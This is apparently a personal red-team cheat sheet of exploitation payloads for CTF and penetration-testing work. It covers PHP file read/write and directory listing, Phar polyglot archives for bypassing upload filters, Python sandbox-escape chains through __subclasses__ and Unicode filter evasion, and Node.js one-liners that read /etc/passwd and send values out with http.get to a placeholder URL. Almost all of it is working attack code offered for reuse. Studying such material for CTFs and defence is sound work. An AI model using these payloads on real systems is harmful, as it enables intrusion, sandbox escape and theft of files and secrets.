# Exploitation Payloads

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) is the way to go, but I noted down some of mine.

<hr class="sep-both">

## Shell

<div class="row row-cols-lg-2"><div>

#### Shell ‚Äî Blind PoC

To see if your code is executed in a (semi) blind context:

```ps
$ ping -c 1 HOST_IP # execute by target
$ sudo tcpdump -i tun0 icmp # see if you got ping
```
</div><div>
</div></div>

<hr class="sep-both">

## PHP

<div class="row row-cols-lg-2"><div>

#### PHP ‚Äî POC

We often run `phpinfo` to get information.

```php!
<?php phpinfo() ?>
```

We may also want some additional information:

```php!
<?php echo "Current directory: " . getcwd(); ?>
```

<br>

#### PHP ‚Äî Read a file

There are multiple functions you might use:

```php!
<?php
$fileContents = file_get_contents('index.php');
$fileContents = show_source('index.php', true);
$fileContents = highlight_file('index.php', true);
$fileContents = readfile('index.php');
echo $fileContents;
?>
```

Base64 encoding is not always necessary, especially with `show_source`.

```php!
$fileContents = base64_encode($fileContents);
```

<br>

#### PHP ‚Äî Write a file

There are multiple functions you might use:

```php!
file_put_contents('/tmp/poc', base64_decode('...')); 
```

You may have to change the permissions:

```php!
chmod('/tmp/poc', 0777);
```
</div><div>

#### PHP ‚Äî Execute Shell Commands

Refer to [webshells#php](/cybersecurity/red-team/s3.exploitation/shell/web_shell.md#php-web-shell).

<br>

#### PHP ‚Äî Directory Listing

A few different ways to achieve the same output:

```php!
<?php
var_dump(scandir("."));

$files = scandir(".");
foreach ($files as $file) {
    echo $file;
}

$dir=dir('.');
while ($f = $dir->read()) {
    echo $f;
}

$dir = opendir(".");
while($f = readdir($dir)) {
    echo $f;
}
```

<br>

#### PHP ‚Äî Catch Requests

Decode `zlib` compressed and `base64` encoded payload.

```php!
$p=str_replace(" ", "+", $_GET['p']);
$r=zlib_decode(base64_decode($p));
file_put_contents('requests.txt', "Request:\n$r\n", FILE_APPEND | LOCK_EX);
```
```php!
if ($_SERVER["REQUEST_METHOD"] === "POST") {} // ...
```

<br>

#### PHP ‚Äî Random

```php!
putenv('LD_PRELOAD=/path/to/xxx.so');
```
</div></div>

<hr class="sep-both">

## Phar

[![file_upload_polyglot](../../../../_badges/rootme/web_server/file_upload_polyglot.svg)](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Polyglot)

<div class="row row-cols-lg-2"><div>

Simply zipping the PHP may work. Otherwise, you can use:

```php!
<?php // Run 'php --define phar.readonly=0 gen.php'
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.php', '<?php /*code*/ ?>');
// or: $phar->addFile('shell.php', 'shell.php');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

‚û°Ô∏è `shell.php` is the file inside the archive.
</div><div>

To create a **Polyglot Phar** <small>(Ex: JPG with \xff\xd8 and \xff\xd9)</small>

```php!
<?php // php --define phar.readonly=0 gen.php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.php', '<?php /*code*/ ?>');
$phar->setStub("\xff\xd8\xff\xd9\n<?php __HALT_COMPILER(); ?>");
$phar->stopBuffering();
```

üìö For reference, `include 'phar://./shell.phar/shell.php';`
</div></div>

<hr class="sep-both">

## Python

<div class="row row-cols-lg-2"><div>

#### Python ‚Äî Execute Shell Commands

Simple python code to run a command.

```py
import os;os.system('ls -1a');
import os;os.popen("ls -1a").read();
import subprocess; subprocess.run(['ls', '-1a']);
import subprocess;print(subprocess.run("whoami", shell=True, stdout=subprocess.PIPE, text=True).stdout)
```

<br>

#### Python ‚Äî Obfuscation

A few utilities to bypass filters:

* `chr(i)` such as `chr(46)` for `.`
* Alternative characters: `gloÔΩÇals()`, `ùò¶ùòπùò¶ùò§`, `ùôöùìçùìÆùò§`
* Alternative characters: [ItalicTextGenerator](https://lingojam.com/ItalicTextGenerator)

Encoding/Decoding utilities:

* For base64 + URL encoding: `base64.urlsafe_b64encode(payload)`
* ...

<br>

#### Python ‚Äî Random Payloads

A few random payloads that I keep there just in case:

```py
xxx.key
xxx.__dict__['key']
```

```py
import os; os.system('whoami')
__import__('os').system('whoami')
__builtins__.__import__('os').system('whoami')
```

```py
xxx.__init__.func_globals['key']
xxx.__init__.__getattribute__("func_globals")['key']
```
</div><div>

#### Python ‚Äî  Deep Introspection

Abusing introspection, we may be able to access any **imported** class and maybe import new ones too. It's complex as indexes are not fixed.

```yaml!
Find: [aclass.__name__ for aclass in current_parent].index('current_class_you_are_looking_for')
Example: [aclass.__name__ for aclass in ().__class__.__base__.__subclasses__()].index('_IOBase')
Example: [aclass.__name__ for aclass in ().__class__.mro()[-1].__subclasses__()].index('_IOBase')
Python 2.7: { file = 40, catch_warnings = 59 }
Python 3.5: { _IOBase = 96, _RawIOBase = 0, FileIO = 0, Popen = -1 }
Python 3.10: { _IOBase = 111, _RawIOBase = 0, FileIO = 0, Popen = -1 }
Python 3.11.8: {_IOBase = 114, _RawIOBase = 1, FileIO = 0, Popen = -1 }
Python 3.11.9: {_IOBase = 115, _RawIOBase = 1, FileIO = 0, BlockFinder = 217, Popen = -1 }
```

A few commands to learn more about your environment:

```py
globals()     # global symbols (variables, functions)
locals()      # local symbols (function, method, block)
vars()        # without any argument, same as 'locals'
__builtins__.__dict__
import builtins; builtins.__dict__       # builtins
import keyword; print(keyword.kwlist)    # keywords
import string; print(string.punctuation) # symbols
local_builtins = ().__class__.__base__.__subclasses__()[59]()._module.__builtins__ # Python2
```


Access the open builtins function:

```py
open = __builtins__.__dict__['open']
open =  ().__class__.__base__.__subclasses__()[40] # Python 2
open = ().__class__.__base__.__subclasses__()[114].__subclasses__()[1].__subclasses__()[0] # Python 3
```

Accessing the `os` module from another module import it:

```py
os = __builtins__.__dict__['__import__']('os')
os = ().__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].os  # Python2
os = ().__class__.__base__.__subclasses__()[217].__init__.__globals__['os']  # Python3
```

You can use this short snippet to find such modules:

```py
for i, aclass in enumerate(().__class__.__base__.__subclasses__()):
    if (not hasattr(aclass, '__init__') or not hasattr(aclass.__init__, '__globals__')
            or not aclass.__init__.__globals__):
        continue
    if 'os' in list(aclass.__init__.__globals__):
        print("Found at ", i)
```
</div></div>

<hr class="sep-both">

## Node.js

<div class="row row-cols-lg-2"><div>

#### Node.js ‚Äî Read Files

Read the source code of the main script:

```js!
require('fs').readFileSync(process.argv[1])
```

#### Node.js ‚Äî Execute Commands

You can use `execSync` or `exec` which is async and using a callback.

```js!
require('child_process').execSync('cat /etc/passwd')
```

#### Node.js ‚Äî HTTP Server

...

#### Node.js ‚Äî HTTP Requests

For get requests, we can use relatively short payloads:

```js!
require('http').get('URL?arg='+url_encoded_value);
```
</div><div>

#### Node.js ‚Äî Encoding/Decoding utilities

```js!
// Base64 Encode
const encodedData = Buffer.from(data).toString('base64');
const decodedData = Buffer.from(encodedData, 'base64').toString('utf-8');
// URL Encode
const urlEncodedString = encodeURIComponent(data);
```
</div></div>